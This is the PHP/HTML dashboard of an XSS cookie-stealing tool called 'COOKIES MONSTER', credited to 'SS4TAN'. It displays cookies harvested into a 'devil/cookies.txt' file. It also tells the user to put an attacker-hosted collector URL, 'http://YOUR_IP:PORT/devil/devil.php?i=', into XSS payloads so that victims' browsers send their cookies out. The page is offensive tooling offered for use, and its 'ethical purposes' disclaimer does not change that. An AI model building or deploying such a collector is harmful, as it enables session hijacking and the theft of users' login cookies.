<?php
// include the file to display the cookies
require_once("devil/index.php");


error_reporting(0);
header('X-Content-Type-Options: nosniff');

// Buffer output securely
ob_start();
show_cookies("devil/cookies.txt");
$cookies_here = ob_get_clean(); 
ob_end_clean();

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>COOKIES MONSTER</title>
</head>
<body>
    <div class="container">
        <h1>> COOKIES MONSTER</h1>
        
        <div class="description">
            > Add this URL to your XSS: http://YOUR_IP:PORT/devil/devil.php?i=<br>
            > use it only for ethical purposes!!<br>
            > By: SS4TAN
        </div>
        
        <div>
           <?php echo $cookies_here; ?>
        </div>
        
        <div class="access-granted">COOKIES MONSTER</div>
    </div>

    <div>

    </div>

</body>
</html>
